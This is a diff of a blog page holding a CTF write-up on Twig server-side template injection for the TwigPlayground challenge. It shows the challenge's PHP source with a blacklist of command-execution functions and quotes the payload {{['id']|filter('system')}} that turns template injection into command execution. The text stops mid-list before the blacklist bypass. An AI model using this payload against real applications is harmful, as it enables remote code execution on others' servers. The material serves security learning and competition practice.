@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="en-us">
-  <head><script src="/livereload.js?port=1313&mindelay=10&v=2" data-no-instant defer></script>
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=&amp;path=livereload" data-no-instant defer></script>
 
     <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
     <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
@@ -20,7 +20,11 @@
       
       
       <li class="pull-left ">
-        <a href="http://localhost:1313/">~/j3seer</a>
+        <a href="https://j3seer.github.io/">~/j3seer
+
+          https://j3seer.github.io/
+          
+        </a>
       </li>
       
       
@@ -91,252 +95,251 @@ Author: 0xM4hm0ud</p>
 <p>Had some time last weekend to play CyberSpace ctf 2024, and managed to solve TwigPlayground by <code>0xM4hm0ud</code></p>
 <h2 id="twig-ssti">Twig SSTI</h2>
 <p>For this challenge, by reading the src we can tell any basic SSTI payload wont work.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">        <span style="color:#ff79c6">&lt;?php</span>
-        ini_set(<span style="color:#f1fa8c">&#39;display_errors&#39;</span>, <span style="color:#bd93f9">0</span>);
-        ini_set(<span style="color:#f1fa8c">&#39;error_reporting&#39;</span>, <span style="color:#bd93f9">0</span>);
-        <span style="color:#ff79c6">if</span> (<span style="color:#8be9fd;font-style:italic">$_SERVER</span>[<span style="color:#f1fa8c">&#39;REQUEST_METHOD&#39;</span>] <span style="color:#ff79c6">===</span> <span style="color:#f1fa8c">&#39;POST&#39;</span>) {
-            <span style="color:#ff79c6">require_once</span> <span style="color:#f1fa8c">&#39;vendor/autoload.php&#39;</span>;
-
-            <span style="color:#8be9fd;font-style:italic">$loader</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> \Twig\Loader\ArrayLoader([]);
-            <span style="color:#8be9fd;font-style:italic">$twig</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> \Twig\Environment(<span style="color:#8be9fd;font-style:italic">$loader</span>, [
-                <span style="color:#f1fa8c">&#39;debug&#39;</span> <span style="color:#ff79c6">=&gt;</span> <span style="color:#ff79c6">true</span>,
-            ]);
-            <span style="color:#8be9fd;font-style:italic">$twig</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">addExtension</span>(<span style="color:#ff79c6">new</span> \Twig\Extension\DebugExtension());
-
-            <span style="color:#8be9fd;font-style:italic">$context</span> <span style="color:#ff79c6">=</span> [
-                <span style="color:#f1fa8c">&#39;user&#39;</span> <span style="color:#ff79c6">=&gt;</span> [
-                    <span style="color:#f1fa8c">&#39;name&#39;</span> <span style="color:#ff79c6">=&gt;</span> <span style="color:#f1fa8c">&#39;Wesley&#39;</span>,
-                    <span style="color:#f1fa8c">&#39;age&#39;</span> <span style="color:#ff79c6">=&gt;</span> <span style="color:#bd93f9">30</span>,
-                ],
-                <span style="color:#f1fa8c">&#39;items&#39;</span> <span style="color:#ff79c6">=&gt;</span> [<span style="color:#f1fa8c">&#39;Apple&#39;</span>, <span style="color:#f1fa8c">&#39;Banana&#39;</span>, <span style="color:#f1fa8c">&#39;Cherry&#39;</span>, <span style="color:#f1fa8c">&#39;Dragonfruit&#39;</span>],
-            ];
-
-            <span style="color:#6272a4">// Ensure no SSTI or RCE vulnerabilities
-</span><span style="color:#6272a4"></span>            <span style="color:#8be9fd;font-style:italic">$blacklist</span> <span style="color:#ff79c6">=</span> [<span style="color:#f1fa8c">&#39;system&#39;</span>, <span style="color:#f1fa8c">&#39;id&#39;</span>, <span style="color:#f1fa8c">&#39;passthru&#39;</span>, <span style="color:#f1fa8c">&#39;exec&#39;</span>, <span style="color:#f1fa8c">&#39;shell_exec&#39;</span>, <span style="color:#f1fa8c">&#39;popen&#39;</span>, <span style="color:#f1fa8c">&#39;proc_open&#39;</span>, 
-                        <span style="color:#f1fa8c">&#39;pcntl_exec&#39;</span>, <span style="color:#f1fa8c">&#39;_self&#39;</span>, <span style="color:#f1fa8c">&#39;reduce&#39;</span>, <span style="color:#f1fa8c">&#39;env&#39;</span>, <span style="color:#f1fa8c">&#39;sort&#39;</span>, <span style="color:#f1fa8c">&#39;map&#39;</span>, <span style="color:#f1fa8c">&#39;filter&#39;</span>, <span style="color:#f1fa8c">&#39;replace&#39;</span>, 
-                        <span style="color:#f1fa8c">&#39;encoding&#39;</span>, <span style="color:#f1fa8c">&#39;include&#39;</span>, <span style="color:#f1fa8c">&#39;file&#39;</span>, <span style="color:#f1fa8c">&#39;run&#39;</span>, <span style="color:#f1fa8c">&#39;Closure&#39;</span>, <span style="color:#f1fa8c">&#39;Callable&#39;</span>, <span style="color:#f1fa8c">&#39;Process&#39;</span>, 
-                        <span style="color:#f1fa8c">&#39;Symfony&#39;</span>, <span style="color:#f1fa8c">&#39;\&#39;&#39;</span>, <span style="color:#f1fa8c">&#39;&#34;&#39;</span>, <span style="color:#f1fa8c">&#39;.&#39;</span>, <span style="color:#f1fa8c">&#39;;&#39;</span>, <span style="color:#f1fa8c">&#39;[&#39;</span>, <span style="color:#f1fa8c">&#39;]&#39;</span>, <span style="color:#f1fa8c">&#39;\\&#39;</span>, <span style="color:#f1fa8c">&#39;/&#39;</span>, <span style="color:#f1fa8c">&#39;-&#39;</span>];
-
-            <span style="color:#8be9fd;font-style:italic">$templateContent</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$_POST</span>[<span style="color:#f1fa8c">&#39;input&#39;</span>] <span style="color:#ff79c6">??</span> <span style="color:#f1fa8c">&#39;&#39;</span>;
-
-            <span style="color:#ff79c6">foreach</span> (<span style="color:#8be9fd;font-style:italic">$blacklist</span> <span style="color:#ff79c6">as</span> <span style="color:#8be9fd;font-style:italic">$item</span>) {
-                <span style="color:#ff79c6">if</span> (stripos(<span style="color:#8be9fd;font-style:italic">$templateContent</span>, <span style="color:#8be9fd;font-style:italic">$item</span>) <span style="color:#ff79c6">!==</span> <span style="color:#ff79c6">false</span>) {
-                    <span style="color:#ff79c6">die</span>(<span style="color:#f1fa8c">&#34;Error: The input contains forbidden content: &#39;</span><span style="color:#f1fa8c">$item</span><span style="color:#f1fa8c">&#39;&#34;</span>);
-                }
-            }
-
-            <span style="color:#ff79c6">try</span> {
-                <span style="color:#8be9fd;font-style:italic">$template</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$twig</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">createTemplate</span>(<span style="color:#8be9fd;font-style:italic">$templateContent</span>);
-
-                <span style="color:#8be9fd;font-style:italic">$result</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$template</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">render</span>(<span style="color:#8be9fd;font-style:italic">$context</span>);
-                <span style="color:#ff79c6">echo</span> <span style="color:#f1fa8c">&#39;&lt;h2&gt;Rendered Output:&lt;/h2&gt;&#39;</span>;
-                <span style="color:#ff79c6">echo</span> <span style="color:#f1fa8c">&#39;&lt;div class=&#34;output&#34;&gt;&#39;</span>;
-                <span style="color:#ff79c6">echo</span> htmlspecialchars(<span style="color:#8be9fd;font-style:italic">$result</span>);  <span style="color:#6272a4">// Ensure no XSS vulnerabilities
-</span><span style="color:#6272a4"></span>                <span style="color:#ff79c6">echo</span> <span style="color:#f1fa8c">&#39;&lt;/div&gt;&#39;</span>;
-            } <span style="color:#ff79c6">catch</span>(Exception <span style="color:#8be9fd;font-style:italic">$e</span>) {
-                <span style="color:#ff79c6">echo</span> <span style="color:#f1fa8c">&#39;&lt;div class=&#34;error&#34;&gt;Something went wrong! Try again.&lt;/div&gt;&#39;</span>;
-            }
-        }
-        <span style="color:#ff79c6">?&gt;</span>
-</code></pre></div><p>However if we wanna solve this challenge we need to understand how actual SSTI in twig is achieved.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;?</span>php
+</span></span><span style="display:flex;"><span>        ini_set(<span style="color:#f1fa8c">&#39;display_errors&#39;</span>, <span style="color:#bd93f9">0</span>);
+</span></span><span style="display:flex;"><span>        ini_set(<span style="color:#f1fa8c">&#39;error_reporting&#39;</span>, <span style="color:#bd93f9">0</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (<span style="color:#8be9fd;font-style:italic">$_SERVER</span>[<span style="color:#f1fa8c">&#39;REQUEST_METHOD&#39;</span>] <span style="color:#ff79c6">===</span> <span style="color:#f1fa8c">&#39;POST&#39;</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">require_once</span> <span style="color:#f1fa8c">&#39;vendor/autoload.php&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">$loader</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> \Twig\Loader\ArrayLoader([]);
+</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">$twig</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> \Twig\Environment(<span style="color:#8be9fd;font-style:italic">$loader</span>, [
+</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;debug&#39;</span> <span style="color:#ff79c6">=&gt;</span> <span style="color:#ff79c6">true</span>,
+</span></span><span style="display:flex;"><span>            ]);
+</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">$twig</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">addExtension</span>(<span style="color:#ff79c6">new</span> \Twig\Extension\DebugExtension());
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">$context</span> <span style="color:#ff79c6">=</span> [
+</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;user&#39;</span> <span style="color:#ff79c6">=&gt;</span> [
+</span></span><span style="display:flex;"><span>                    <span style="color:#f1fa8c">&#39;name&#39;</span> <span style="color:#ff79c6">=&gt;</span> <span style="color:#f1fa8c">&#39;Wesley&#39;</span>,
+</span></span><span style="display:flex;"><span>                    <span style="color:#f1fa8c">&#39;age&#39;</span> <span style="color:#ff79c6">=&gt;</span> <span style="color:#bd93f9">30</span>,
+</span></span><span style="display:flex;"><span>                ],
+</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;items&#39;</span> <span style="color:#ff79c6">=&gt;</span> [<span style="color:#f1fa8c">&#39;Apple&#39;</span>, <span style="color:#f1fa8c">&#39;Banana&#39;</span>, <span style="color:#f1fa8c">&#39;Cherry&#39;</span>, <span style="color:#f1fa8c">&#39;Dragonfruit&#39;</span>],
+</span></span><span style="display:flex;"><span>            ];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#6272a4">// Ensure no SSTI or RCE vulnerabilities
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>            <span style="color:#8be9fd;font-style:italic">$blacklist</span> <span style="color:#ff79c6">=</span> [<span style="color:#f1fa8c">&#39;system&#39;</span>, <span style="color:#f1fa8c">&#39;id&#39;</span>, <span style="color:#f1fa8c">&#39;passthru&#39;</span>, <span style="color:#f1fa8c">&#39;exec&#39;</span>, <span style="color:#f1fa8c">&#39;shell_exec&#39;</span>, <span style="color:#f1fa8c">&#39;popen&#39;</span>, <span style="color:#f1fa8c">&#39;proc_open&#39;</span>, 
+</span></span><span style="display:flex;"><span>                        <span style="color:#f1fa8c">&#39;pcntl_exec&#39;</span>, <span style="color:#f1fa8c">&#39;_self&#39;</span>, <span style="color:#f1fa8c">&#39;reduce&#39;</span>, <span style="color:#f1fa8c">&#39;env&#39;</span>, <span style="color:#f1fa8c">&#39;sort&#39;</span>, <span style="color:#f1fa8c">&#39;map&#39;</span>, <span style="color:#f1fa8c">&#39;filter&#39;</span>, <span style="color:#f1fa8c">&#39;replace&#39;</span>, 
+</span></span><span style="display:flex;"><span>                        <span style="color:#f1fa8c">&#39;encoding&#39;</span>, <span style="color:#f1fa8c">&#39;include&#39;</span>, <span style="color:#f1fa8c">&#39;file&#39;</span>, <span style="color:#f1fa8c">&#39;run&#39;</span>, <span style="color:#f1fa8c">&#39;Closure&#39;</span>, <span style="color:#f1fa8c">&#39;Callable&#39;</span>, <span style="color:#f1fa8c">&#39;Process&#39;</span>, 
+</span></span><span style="display:flex;"><span>                        <span style="color:#f1fa8c">&#39;Symfony&#39;</span>, <span style="color:#f1fa8c">&#39;\&#39;&#39;</span>, <span style="color:#f1fa8c">&#39;&#34;&#39;</span>, <span style="color:#f1fa8c">&#39;.&#39;</span>, <span style="color:#f1fa8c">&#39;;&#39;</span>, <span style="color:#f1fa8c">&#39;[&#39;</span>, <span style="color:#f1fa8c">&#39;]&#39;</span>, <span style="color:#f1fa8c">&#39;\\&#39;</span>, <span style="color:#f1fa8c">&#39;/&#39;</span>, <span style="color:#f1fa8c">&#39;-&#39;</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">$templateContent</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$_POST</span>[<span style="color:#f1fa8c">&#39;input&#39;</span>] <span style="color:#ff79c6">??</span> <span style="color:#f1fa8c">&#39;&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">foreach</span> (<span style="color:#8be9fd;font-style:italic">$blacklist</span> <span style="color:#ff79c6">as</span> <span style="color:#8be9fd;font-style:italic">$item</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">if</span> (stripos(<span style="color:#8be9fd;font-style:italic">$templateContent</span>, <span style="color:#8be9fd;font-style:italic">$item</span>) <span style="color:#ff79c6">!==</span> <span style="color:#ff79c6">false</span>) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">die</span>(<span style="color:#f1fa8c">&#34;Error: The input contains forbidden content: &#39;</span><span style="color:#f1fa8c">$item</span><span style="color:#f1fa8c">&#39;&#34;</span>);
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">try</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#8be9fd;font-style:italic">$template</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$twig</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">createTemplate</span>(<span style="color:#8be9fd;font-style:italic">$templateContent</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#8be9fd;font-style:italic">$result</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$template</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">render</span>(<span style="color:#8be9fd;font-style:italic">$context</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">echo</span> <span style="color:#f1fa8c">&#39;&lt;h2&gt;Rendered Output:&lt;/h2&gt;&#39;</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">echo</span> <span style="color:#f1fa8c">&#39;&lt;div class=&#34;output&#34;&gt;&#39;</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">echo</span> htmlspecialchars(<span style="color:#8be9fd;font-style:italic">$result</span>);  <span style="color:#6272a4">// Ensure no XSS vulnerabilities
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>                <span style="color:#ff79c6">echo</span> <span style="color:#f1fa8c">&#39;&lt;/div&gt;&#39;</span>;
+</span></span><span style="display:flex;"><span>            } <span style="color:#ff79c6">catch</span>(Exception <span style="color:#8be9fd;font-style:italic">$e</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">echo</span> <span style="color:#f1fa8c">&#39;&lt;div class=&#34;error&#34;&gt;Something went wrong! Try again.&lt;/div&gt;&#39;</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">?&gt;</span>
+</span></span></code></pre></div><p>However if we wanna solve this challenge we need to understand how actual SSTI in twig is achieved.</p>
 <h2 id="basic-ssti-in-twig">Basic SSTI in Twig</h2>
 <p>First let&rsquo;s ignore the long blacklist, let&rsquo;s see how we can achieve RCE from SSTI in twig</p>
 <p>A simple example from payloads all things</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">{{[<span style="color:#f1fa8c">&#39;id&#39;</span>]<span style="color:#ff79c6">|</span>filter(<span style="color:#f1fa8c">&#39;system&#39;</span>)}}
-</code></pre></div><p>What&rsquo;s happening here? Let&rsquo;s check twig&rsquo;s definition of the filter <code>filter</code></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#6272a4">// file: src/Extension/CoreExtenion.php
-</span><span style="color:#6272a4"></span>
-    <span style="color:#ff79c6">public</span> <span style="color:#ff79c6">static</span> <span style="color:#8be9fd;font-style:italic">function</span> filter(Environment $env, $array, $arrow)
-    {
-        <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>is_iterable($array)) {
-            <span style="color:#ff79c6">throw</span> <span style="color:#ff79c6">new</span> RuntimeError(\sprintf(<span style="color:#f1fa8c">&#39;The &#34;filter&#34; filter expects a sequence/mapping or &#34;Traversable&#34;, got &#34;%s&#34;.&#39;</span>, \is_object($array) <span style="color:#ff79c6">?</span> \get_class($array) <span style="color:#ff79c6">:</span> \gettype($array)));
-        }
-
-        self<span style="color:#ff79c6">::</span>checkArrowInSandbox($env, $arrow, <span style="color:#f1fa8c">&#39;filter&#39;</span>, <span style="color:#f1fa8c">&#39;filter&#39;</span>);
-
-        <span style="color:#ff79c6">if</span> (\is_array($array)) {
-            <span style="color:#ff79c6">return</span> array_filter($array, $arrow, \ARRAY_FILTER_USE_BOTH);
-        }
-
-        <span style="color:#6272a4">// the IteratorIterator wrapping is needed as some internal PHP classes are \Traversable but do not implement \Iterator
-</span><span style="color:#6272a4"></span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">new</span> \CallbackFilterIterator(<span style="color:#ff79c6">new</span> \IteratorIterator($array), $arrow);
-    }
-
-</code></pre></div><p>In this example, the filter() function is using the builtin php function <code>array_filter</code>, however this function can be dangerous if we are able to call an arrow function/callback function.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>{{[<span style="color:#f1fa8c">&#39;id&#39;</span>]<span style="color:#ff79c6">|</span>filter(<span style="color:#f1fa8c">&#39;system&#39;</span>)}}
+</span></span></code></pre></div><p>What&rsquo;s happening here? Let&rsquo;s check twig&rsquo;s definition of the filter <code>filter</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#6272a4">// file: src/Extension/CoreExtenion.php
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">public</span> <span style="color:#ff79c6">static</span> <span style="color:#8be9fd;font-style:italic">function</span> filter(Environment $env, $array, $arrow)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>is_iterable($array)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">throw</span> <span style="color:#ff79c6">new</span> RuntimeError(\sprintf(<span style="color:#f1fa8c">&#39;The &#34;filter&#34; filter expects a sequence/mapping or &#34;Traversable&#34;, got &#34;%s&#34;.&#39;</span>, \is_object($array) <span style="color:#ff79c6">?</span> \get_class($array) <span style="color:#ff79c6">:</span> \gettype($array)));
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        self<span style="color:#ff79c6">::</span>checkArrowInSandbox($env, $arrow, <span style="color:#f1fa8c">&#39;filter&#39;</span>, <span style="color:#f1fa8c">&#39;filter&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (\is_array($array)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> array_filter($array, $arrow, \ARRAY_FILTER_USE_BOTH);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">// the IteratorIterator wrapping is needed as some internal PHP classes are \Traversable but do not implement \Iterator
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">new</span> \CallbackFilterIterator(<span style="color:#ff79c6">new</span> \IteratorIterator($array), $arrow);
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>In this example, the filter() function is using the builtin php function <code>array_filter</code>, however this function can be dangerous if we are able to call an arrow function/callback function.</p>
 <p>So in the background this is what&rsquo;s really happening:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">array_filter([<span style="color:#f1fa8c">&#39;id&#39;</span>],<span style="color:#f1fa8c">&#39;system&#39;</span>); <span style="color:#6272a4">// uid=0(root) gid=0(root) groups=0(root)
-</span></code></pre></div><h2 id="twig-source">Twig source</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>array_filter([<span style="color:#f1fa8c">&#39;id&#39;</span>],<span style="color:#f1fa8c">&#39;system&#39;</span>); <span style="color:#6272a4">// uid=0(root) gid=0(root) groups=0(root)
+</span></span></span></code></pre></div><h2 id="twig-source">Twig source</h2>
 <p>Okey, great we know how it works now we can start figuring out the bypass. While reading the twig src code, we find a different number of functions and filters defined, let&rsquo;s list them all and check whats blocked</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">    <span style="color:#ff79c6">public</span> <span style="color:#8be9fd;font-style:italic">function</span> getFilters()<span style="color:#ff79c6">:</span> array
-    {
-        <span style="color:#ff79c6">return</span> [
-            <span style="color:#6272a4">// formatting filters
-</span><span style="color:#6272a4"></span>            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;date&#39;</span>, [$this, <span style="color:#f1fa8c">&#39;formatDate&#39;</span>]),
-            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;date_modify&#39;</span>, [$this, <span style="color:#f1fa8c">&#39;modifyDate&#39;</span>]),
-            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;format&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;sprintf&#39;</span>]),
-            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;replace&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;replace&#39;</span>]),
-            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;number_format&#39;</span>, [$this, <span style="color:#f1fa8c">&#39;formatNumber&#39;</span>]),
-            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;abs&#39;</span>, <span style="color:#f1fa8c">&#39;abs&#39;</span>),
-            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;round&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;round&#39;</span>]),
-
-            <span style="color:#6272a4">// encoding
-</span><span style="color:#6272a4"></span>            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;url_encode&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;urlencode&#39;</span>]),
-            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;json_encode&#39;</span>, <span style="color:#f1fa8c">&#39;json_encode&#39;</span>),
-            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;convert_encoding&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;convertEncoding&#39;</span>]),
-
-            <span style="color:#6272a4">// string filters
-</span><span style="color:#6272a4"></span>            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;title&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;titleCase&#39;</span>], [<span style="color:#f1fa8c">&#39;needs_charset&#39;</span> =&gt; <span style="color:#ff79c6">true</span>]),
-            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;capitalize&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;capitalize&#39;</span>], [<span style="color:#f1fa8c">&#39;needs_charset&#39;</span> =&gt; <span style="color:#ff79c6">true</span>]),
-            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;upper&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;upper&#39;</span>], [<span style="color:#f1fa8c">&#39;needs_charset&#39;</span> =&gt; <span style="color:#ff79c6">true</span>]),
-            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;lower&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;lower&#39;</span>], [<span style="color:#f1fa8c">&#39;needs_charset&#39;</span> =&gt; <span style="color:#ff79c6">true</span>]),
-            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;striptags&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;striptags&#39;</span>]),
-            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;trim&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;trim&#39;</span>]),
-            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;nl2br&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;nl2br&#39;</span>], [<span style="color:#f1fa8c">&#39;pre_escape&#39;</span> =&gt; <span style="color:#f1fa8c">&#39;html&#39;</span>, <span style="color:#f1fa8c">&#39;is_safe&#39;</span> =&gt; [<span style="color:#f1fa8c">&#39;html&#39;</span>]]),
-            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;spaceless&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;spaceless&#39;</span>], [<span style="color:#f1fa8c">&#39;is_safe&#39;</span> =&gt; [<span style="color:#f1fa8c">&#39;html&#39;</span>], <span style="color:#f1fa8c">&#39;deprecation_info&#39;</span> =&gt; <span style="color:#ff79c6">new</span> DeprecatedCallableInfo(<span style="color:#f1fa8c">&#39;twig/twig&#39;</span>, <span style="color:#f1fa8c">&#39;3.12&#39;</span>)]),
-
-            <span style="color:#6272a4">// array helpers
-</span><span style="color:#6272a4"></span>            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;join&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;join&#39;</span>]),
-            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;split&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;split&#39;</span>], [<span style="color:#f1fa8c">&#39;needs_charset&#39;</span> =&gt; <span style="color:#ff79c6">true</span>]),
-            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;sort&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;sort&#39;</span>], [<span style="color:#f1fa8c">&#39;needs_environment&#39;</span> =&gt; <span style="color:#ff79c6">true</span>]),
-            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;merge&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;merge&#39;</span>]),
-            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;batch&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;batch&#39;</span>]),
